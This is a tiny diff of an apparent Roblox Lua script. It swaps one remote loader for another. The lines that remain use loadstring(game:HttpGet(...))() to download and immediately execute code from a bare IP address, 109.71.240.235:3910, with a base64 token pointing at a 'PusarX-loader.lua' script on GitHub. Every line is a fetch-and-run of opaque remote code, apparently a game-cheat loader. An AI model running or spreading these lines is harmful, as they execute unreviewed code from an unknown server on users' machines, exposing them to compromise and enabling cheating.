@@ -1,2 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Estevansit0/KJJK/refs/heads/main/PusarX-loader.lua"))()
-loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjU2NTU5M2Y5LTY0NDItNDM4NC1iYzQ2LTYxNmRhZGYwYzE0OCIsImtpbmQiOiJsb2FkZXIifQ"))()
+loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjU2NTU5M2Y5LTY0NDItNDM4NC1iYzQ2LTYxNmRhZGYwYzE0OCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vRXN0ZXZhbnNpdDAvS0pKSy9yZWZzL2hlYWRzL21haW4vUHVzYXJYLWxvYWRlci5sdWEifX0"))()
